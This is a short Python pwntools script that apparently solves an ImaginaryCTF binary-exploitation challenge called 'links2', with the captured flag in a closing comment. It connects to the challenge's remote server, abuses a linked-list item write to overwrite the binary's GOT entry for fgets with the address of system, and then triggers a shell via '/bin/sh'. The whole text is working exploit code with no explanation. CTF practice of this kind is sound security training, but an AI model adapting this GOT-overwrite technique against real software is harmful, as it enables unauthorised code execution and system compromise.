from pwn import *

elf = ELF("./links2")
# io = process("./links2")
io = remote("puzzler7.imaginaryctf.org", 2007)


def view_list():
    io.sendlineafter(b">>> ", "1")


def write_item(idx, data):
    io.sendlineafter(b">>> ", b"2")
    io.sendlineafter(b">>> ", str(idx).encode())
    io.sendlineafter(b">>> ", data)


write_item(0, b"/bin/sh")
write_item(1, b"1")
write_item(2, b"2")
write_item(1, flat({64: p64(elf.got["fgets"])}))
write_item(2, p64(elf.sym['system']))
write_item(0, b"/bin/sh")
io.interactive()
# ictf{who_knew_the_current_date_could_be_so_dangerous?}
